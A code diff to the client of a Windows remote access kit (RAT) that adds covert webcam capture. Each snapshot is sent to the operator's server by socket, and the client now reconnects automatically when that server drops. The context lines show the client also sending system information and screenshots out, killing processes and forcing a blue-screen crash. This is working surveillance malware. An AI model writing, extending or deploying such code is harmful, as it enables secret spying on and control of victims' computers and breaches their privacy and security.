@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 
 import socket
@@ -21,6 +21,7 @@ import os
 import subprocess
 import threading
 import struct
+import cv2
 
 from PIL import ImageGrab
 from time import sleep
@@ -89,6 +90,15 @@ class Utilitys:
         extracted_info = f'{sysinfo_output}\n{ip_config_output}'             #Join the two variables
         return extracted_info                                                #Return the output
 
+    #Returns bool based on webcam detection
+    def check_for_webcam(self):
+        webcam = cv2.VideoCapture(0)        #Create webcam object for the first webcam that is found
+        if not webcam.isOpened():           #If it can't be opened
+            webcam.release()                #Release the webcam
+            return False                    #Return false
+        webcam.release()                    #Else if the cam can be opened, release
+        return True                         #return true
+
 class SystemManager:
 
     #Function will crash the computer with a blue screen
@@ -151,6 +161,7 @@ class ClientSocket:
         self.disconnect = 'disconnect'
         self.process_manager = 'proc_list'
         self.term_process = 'terminate'
+        self.snapshot = 'snap_shot'
 
     #Function will connect to server to initiate handshake
     def connect_to_server(self):
@@ -246,6 +257,8 @@ class ClientSocket:
                 SystemManager().extract_process_list()                                #Send process's to server
             if action_flag == self.term_process:                                      #if the action is to kill a process
                 SystemManager().kill_task(server_command[1])                          #kill the task by pid received from server
+            if action_flag == self.snapshot:                                          #if the action is to send a snapshot from the webcam
+                StreamSocket().webcam_snapshot()                                      #Send a webcam snapshot
 
     #Function will retrieve all data sent by server socket
     def recv_all_data(self):
@@ -261,8 +274,12 @@ class ClientSocket:
                 return bytes_data                                           #Return the bytes data when the data received == the data sent
             else:                                                           #Else the initial data is all the data
                 return data_size[1]                                         #Return the encrypted data half of the array from the split
+
         except ValueError:                                                  #If there is a value error, indicating the connection with the server was lost
             return self.connect_to_server()                                 #connect back to the server
+
+        except ConnectionResetError:                                        #If the server shuts down in the middle of the transfer
+            return self.connect_to_server()                                 #Connect back to it
 
     #Funtion will get data from the server and return it as plaintext. If the server disconnects, the client will attempt
     #To connect back
@@ -307,6 +324,7 @@ class StreamSocket:
     #Function will take single or multiple screenshots depending on boolean parameter
     def stream_desktop(self,screenshot):
         StreamSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         #Create socket
+        StreamSocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         ip_address = socket.gethostbyname(ClientSocket().dns_address)           #Resolve dns
         StreamSocket.connect((ip_address,STRM_PORT))                            #connect to ip and streaming port
         if not screenshot:                                                      #If screenshot is false
@@ -320,6 +338,26 @@ class StreamSocket:
             StreamSocket.sendall(image_data)                                    #send struct
         StreamSocket.close()                                                    #close socket
 
+    #Function will send a snapshot of the webcam if one is present, else it will return a
+    #message that prompts the server that it couldnt find it
+    def webcam_snapshot(self):
+        if not Utilitys().check_for_webcam():               #If the check function doesn't find a webcam
+            ExfilSocket().exfil_socket_send('NoneFound')    #Notify the server
+        else:                                               #else, the function returns true
+            ExfilSocket().exfil_socket_send('Found')        #Notify server to continue handling
+            stream_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Create socket
+            stream_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Set sock opts
+            ip_address = socket.gethostbyname(ClientSocket().dns_address)  # Resolve dns
+            stream_sock.connect((ip_address, STRM_PORT))  # connect to ip and streaming port
+            web_cam = cv2.VideoCapture(0)                   #Create webcam object
+            ret, img = web_cam.read()                       #Capture image from webcam
+            cv2.imwrite(self.image_file_path,img)           #Write image to file
+            with open(self.image_file_path,'rb') as file:   #Read the image
+                data = file.read()                          #Capture the date
+                file.close()
+            stream_sock.sendall(struct.pack(">Q",len(data)))    #the len of the data as a struct
+            stream_sock.sendall(data)                           #Send the rest of the data
+            stream_sock.close()                                 #Close socket
 
 class CodeExecution():
 
